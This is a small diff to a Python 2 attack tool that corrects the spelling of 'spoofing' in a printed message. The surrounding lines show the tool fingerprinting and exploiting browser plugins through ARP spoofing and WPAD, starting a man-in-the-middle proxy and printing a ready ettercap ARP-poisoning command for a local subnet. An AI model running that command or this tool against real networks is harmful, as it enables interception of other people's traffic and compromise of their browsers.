@@ -309,7 +309,7 @@ def main():
 	print bcolors.OKGREEN+"[Fingerprints and Exploits Browser Plugins (Java/Flash/Reader) via ARP Spoofing/WPAD]\n"+bcolors.ENDC
 	startMITMproxy()
 	modifyHTML('fingerprint_template.html')
-	print "[*] If you want to use ARP spofing, run the command in another terminal (replace X with the target host)"
+	print "[*] If you want to use ARP spoofing, run the command in another terminal (replace X with the target host)"
 	ipSplit=gatewayIP.split(".")
 	subnetStr=ipSplit[0]+'.'+ipSplit[1]+'.'+ipSplit[2]+'.X'
 	print bcolors.OKGREEN+"ettercap -T -q -M ARP /"+subnetStr+"/  /"+gatewayIP+"/"+bcolors.ENDC
